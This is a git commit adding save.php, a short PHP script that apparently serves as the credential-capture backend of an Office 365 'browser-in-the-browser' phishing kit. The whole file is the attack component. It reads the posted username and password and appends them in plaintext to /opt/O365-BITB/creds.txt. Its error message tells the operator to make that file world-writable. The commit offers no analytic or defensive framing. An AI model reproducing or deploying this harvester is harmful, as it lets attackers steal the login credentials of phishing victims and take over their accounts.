6929aea956385cf3de076b7cdb7b14e4f5f183c7
jakedmurphy1 <44781280+jakedmurphy1@users.noreply.github.com>
2022-08-24 09:11:51 -0400

    Add files via upload

---
+++ save.php
@@ -0,0 +1,16 @@
+<?php
+
+$username = $_POST['username'];
+$password = $_POST['passwd'];
+
+$myfile = fopen("/opt/O365-BITB/creds.txt", "a") or die("Unable to open file, ensure filepath is correct (Line 6) and chmod 666 it.");
+
+fwrite($myfile, $username);
+fwrite($myfile, ":");
+fwrite($myfile, $password);
+fwrite($myfile, "\n");
+fclose($myfile);
+
+die();
+
+?>
